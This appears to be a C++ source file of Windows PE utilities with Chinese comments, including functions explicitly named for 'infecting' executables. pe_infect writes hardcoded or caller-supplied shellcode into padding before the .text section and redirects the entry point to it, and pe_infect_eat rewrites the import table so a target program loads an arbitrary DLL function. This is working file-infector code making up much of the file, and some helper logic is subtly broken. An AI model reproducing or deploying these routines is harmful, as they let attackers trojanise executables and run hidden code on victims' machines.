#include "stdafx.h"
#include "pe.h"

//
PVOID
	ImageVaToRva(
	__in PIMAGE_NT_HEADERS NtHeaders,
	__in PVOID Base,
	__in ULONG Va
	)
{
	DWORD dwVa = Va;

	//
	PIMAGE_SECTION_HEADER SecHeader = (PIMAGE_SECTION_HEADER)((DWORD)NtHeaders + NtHeaders->FileHeader.SizeOfOptionalHeader + 0x18);

	//
	for(int i=0;i<NtHeaders->FileHeader.NumberOfSections;i++)
	{
		DWORD dwSectionVa = (DWORD)Base + SecHeader[i].PointerToRawData;
		DWORD dwSectionSize = SecHeader[i].SizeOfRawData;

		if(dwVa >= dwSectionVa && dwVa < (dwSectionSize + dwSectionVa))
		{
			dwVa = dwVa - (DWORD)Base;
			dwVa = dwVa + SecHeader[i].VirtualAddress;
			dwVa = dwVa - SecHeader[i].PointerToRawData;
			//
			return (PVOID)dwVa;
		}
		else if(dwVa < dwSectionVa)  
		{
			//如果计算值大于前一区段的最大值，而后一区段地址大于计算值
			//则假设在前一区段:
			dwVa = dwVa - (DWORD)Base;
			dwVa = dwVa + SecHeader[i-1].VirtualAddress;
			dwVa = dwVa - SecHeader[i-1].PointerToRawData;
		}
	}

	return NULL;
}

//
PVOID pe_getMapViewOfFile(LPTSTR lpFilePath)
{
	//打开目标文件
	HANDLE hFile = CreateFile(lpFilePath,GENERIC_READ,FILE_SHARE_READ,NULL,3,0,NULL);

	//打开失败
	if (!hFile)
	{
		return NULL;
	}

	//文件映射
	HANDLE hMap = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,NULL);

	//映射失败
	if (!hMap)
	{
		CloseHandle(hFile);
		return NULL;
	}

	//文件到内存的映射
	PVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ,0,0,0);

	//失败
	if (!lpBase)
	{
		CloseHandle(hMap);
		CloseHandle(hFile);
		return NULL;
	}

	//
	return lpBase;
}

//查找目标程序有无目标模块
void pe_findDllModule(LPTSTR lpFilePath,LPSTR lpDllName,ppe_retn_msg p_msg)
{
	//打开文件
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//打开文件失败
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//获得文件大小
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//映射文件
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//文件映射内存失败
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//获得映射基址
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//文件映射内存失败
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//获得dos头部
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//获得nt头部
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//获得导入表
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[1].VirtualAddress,NULL);
	
	//遍历导入表
	while(pImage_import_descriptor->Name != NULL)
	{
		if (pImage_import_descriptor->OriginalFirstThunk == 0 && pImage_import_descriptor->FirstThunk == 0) 
		{
			break;
		}

		//如果找到目标模块的话
		if(!strcmpi((LPSTR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->Name,NULL),lpDllName))
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = true;
			return;
		}

		//
		pImage_import_descriptor ++;
	}

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	//看来是没有找到
	p_msg->isSuccessed = false;
	swprintf(p_msg->tsMsg,L"no error!");
}

//查找导出表目录
bool pe_findExportDir(LPTSTR lpFilePath){
	//打开文件
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//打开文件失败
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//
		return false;
	}

	//获得文件大小
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//映射文件
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//文件映射内存失败
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		//
		return false;
	}

	//获得映射基址
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//文件映射内存失败
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		//
		return false;
	}

	//获得dos头部
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//获得nt头部
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//获得导出表
	PIMAGE_EXPORT_DIRECTORY pImage_export_directory = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,NULL);

	//
	if(!pImage_export_directory)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		return false;
	}

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	return true;
}

//获得text段的偏移
DWORD pe_getTextSecOffset(PIMAGE_SECTION_HEADER pImage_section_header , int NumberOfSections)
{
	if (NumberOfSections > 0)
	{
		//因为第一个Section就是.text
		if(!strcmpi((PCHAR)pImage_section_header->Name,".text"))
		{
			return pImage_section_header->PointerToRawData;
		}
		else
		{
			return 0;
		}
	}
	else
	{
		return 0;
	}
}

//感染
//int bool double等基本类型可以返回
//结构体、pchar等不可以返回
//擦，害的我半死
void pe_infect(LPTSTR lpFilePath,LPTSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg)
{
	/* shell code*/
	/*push 0 */
	/*mov eax , func_addr (address will be inserted)*/
	/*call eax */
	/*mov eax, ori oep */
	/*jmp eax */

	//shellcode
	char code[] = "\x6A\x00\xB8\x00\x00\x00\x00\xFF\xD0\xB8\x00\x00\x00\x00\xFF\xE0";   

	//打开文件
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//打开文件失败
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//获得文件大小
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//映射文件
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//文件映射内存失败
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//获得映射基址
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//文件映射内存失败
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
	//#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)ntheader + FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))

	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;
	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);
	//
	PIMAGE_SECTION_HEADER pImage_section_header= IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	//
	DWORD dwDelta = dwSectionOffset - sizeof(code);

	//
	for(int i=0 ; i < sizeof(code) ; i++)
	{
		BYTE check = *((PBYTE)lpBase + dwDelta + i);
		//
		if(check != 0)
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = false;
			swprintf(p_msg->tsMsg,L"not enough space in .text section!");
			//
			return ;
		}
	}

	//获得DLL中导出函数地址
	//DWORD func_addr = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll") , "ExitProcess");

	//获得DLL中导出函数地址
	DWORD dwFuncAddr = (DWORD)GetProcAddress(LoadLibrary(lpDllName), lpFuncName);

	//如果获得函数地址
	if (dwFuncAddr == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		USES_CONVERSION;
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find %ws address!",A2W(lpFuncName));
		//
		return ;
	}

	//shellcode填补
	for(int i=0 ; i < sizeof(code); i++)
	{
		if(*(PBYTE)(code + i) == 0xB8)
		{
			*(PDWORD)(code + i+ 1) = dwFuncAddr;
			break;
		}
	}

	int movCount = 0;

	//shellcode填补
	for(int i=0 ; i < sizeof(code); i++)
	{
		//跳到原始OEP
		if(*(PBYTE)(code + i) == 0xB8)
		{
			movCount ++;
		}

		if (movCount == 2)
		{
			//pImage_nt_header->OptionalHeader.ImageBase 装载在内存的地址
			*(PDWORD)(code + i+ 1) = pImage_nt_header->OptionalHeader.ImageBase + pImage_nt_header->OptionalHeader.AddressOfEntryPoint;
			break;
		}
	}

	
	//写入数据
	memcpy(lpBase + dwDelta,code,sizeof(code));

	//new OEP
	pImage_nt_header->OptionalHeader.AddressOfEntryPoint = dwDelta;

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//感染2
void pe_infect(LPTSTR lpFilePath,PBYTE lpShellCode,ppe_retn_msg p_msg,int size)
{
	//打开文件
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//打开文件失败
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//获得文件大小
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//映射文件
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//文件映射内存失败
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//获得映射基址
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//文件映射内存失败
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
	//#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)ntheader + FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))

	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;
	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);
	//
	PIMAGE_SECTION_HEADER pImage_section_header= IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	//
	DWORD dwDelta = dwSectionOffset - size;

	//
	for(int i=0 ; i < size ; i++)
	{
		BYTE check = *((PBYTE)lpBase + dwDelta + i);
		//
		if(check != 0)
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = false;
			swprintf(p_msg->tsMsg,L"not enough space in .text section!");
			//
			return ;
		}
	}

	//写入数据
	memcpy(lpBase + dwDelta,lpShellCode,size);

	//new OEP
	pImage_nt_header->OptionalHeader.AddressOfEntryPoint = dwDelta;

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//导入表感染
void pe_infect_eat(LPTSTR lpFilePath,LPSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg)
{
	//打开文件
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//打开文件失败
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//获得文件大小
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//映射文件
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//文件映射内存失败
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//获得映射基址
	PBYTE lpBase = (PBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//文件映射内存失败
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//dos
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;

	//nt
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);

	//
	PIMAGE_OPTIONAL_HEADER32 pImage_optional_header = (PIMAGE_OPTIONAL_HEADER32)(lpBase + pImage_dos_header->e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER));

	//sec
	PIMAGE_SECTION_HEADER pImage_section_header = IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	/*
	PointerToRawData 为节区在PE文件中的偏移
	SizeOfRawData >= VirtualSize 
	VirtualSize      是节在内存中的长度 
	SizeOfRawData    则是VirtualSize经文件对齐后的尺寸。 
	比如: 你的.text的代码段长是0x110但是文件对齐尺寸是0x400,那.text的SizeOfRawData   就是0x400,而virtualSize就是0x110
	*/

	//import
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[1].VirtualAddress,NULL);
	
	//
	int importTableCount = 0;

	//获得导入表的数目
	while(pImage_import_descriptor[importTableCount].Characteristics != 0)
	{
		importTableCount ++;
	}

	//已有导入表数据的大小
	DWORD dwBufferSize = sizeof(IMAGE_IMPORT_DESCRIPTOR) * importTableCount;

	//获得第一个块的va
	PBYTE pSectionEnd = lpBase + pImage_section_header->PointerToRawData + pImage_section_header->SizeOfRawData - 1;

	//空闲空间大小
	UINT pPadSize = 0;

	//获得空闲空间大小
	while(*pSectionEnd == 0)
	{
		pPadSize ++;
		pSectionEnd --;
	}
	
	//
	PBYTE pSectionStart = pSectionEnd; 

	if (pPadSize < dwBufferSize + sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"not enough space in .text section!");
		//
		return ;
	}

	//复制原始的引入表到.text空闲空间里面
	memcpy(pSectionStart,pImage_import_descriptor,dwBufferSize);

	//清空原始的引入表
	memset(pImage_import_descriptor,0,dwBufferSize);

	//定义一个新的引入表
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor_new = PIMAGE_IMPORT_DESCRIPTOR(pSectionStart + dwBufferSize);

	//新的dll name
	strcpy((PCHAR)pImage_import_descriptor,lpDllName);
	PIMAGE_IMPORT_BY_NAME  pImage_import_by_name = (PIMAGE_IMPORT_BY_NAME)((PCHAR)(pImage_import_descriptor + 1)) + 5;

	//image_thunk_data
	DWORD dwThunkData = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)pImage_import_by_name);

	memcpy((PCHAR)(pImage_import_descriptor + 1), &dwThunkData, 4);

	pImage_import_by_name->Hint = 0;
	//复制函数名
	strcpy((PCHAR)pImage_import_by_name->Name,lpFuncName);

	pImage_import_descriptor_new->Name = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)pImage_import_descriptor);
	pImage_import_descriptor_new->FirstThunk = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pImage_import_descriptor + 1));
	pImage_import_descriptor_new->OriginalFirstThunk = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pImage_import_descriptor + 1));
	pImage_import_descriptor_new->ForwarderChain = 0;
	pImage_import_descriptor_new->TimeDateStamp = 0;

	pImage_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pSectionStart));
	pImage_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size +=sizeof(IMAGE_IMPORT_DESCRIPTOR);

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//
DWORD pe_getImportOriFuncAddressByOrdinal(PVOID lpBase,LPSTR lpDllName,DWORD dwOrdinal)
{
	//获得dos头部
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//获得nt头部
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//获得导入表
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,NULL);

	//遍历导入表
	while(pImage_import_descriptor->Characteristics != 0)
	{
		if (!stricmp((LPSTR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->Name,NULL),lpDllName))
		{
			//
			return *(PDWORD)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->FirstThunk + dwOrdinal*4,NULL);
		}
		
		pImage_import_descriptor++;
	};
}

//
DWORD pe_getExportOriFuncAddressByOrdinal(PVOID lpBase,DWORD dwOrdinal)
{
	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;

	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((PBYTE)lpBase + pImage_dos_header->e_lfanew);

	//
	PIMAGE_EXPORT_DIRECTORY pImage_export_directory = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,NULL);

	if (!pImage_export_directory)
	{
		return -1;
	}

	//
	DWORD dwOriFuncAddr = *(PDWORD)ImageRvaToVa(pImage_nt_header,lpBase,pImage_export_directory->AddressOfFunctions + dwOrdinal * 4,NULL);

	//
	return dwOriFuncAddr;
}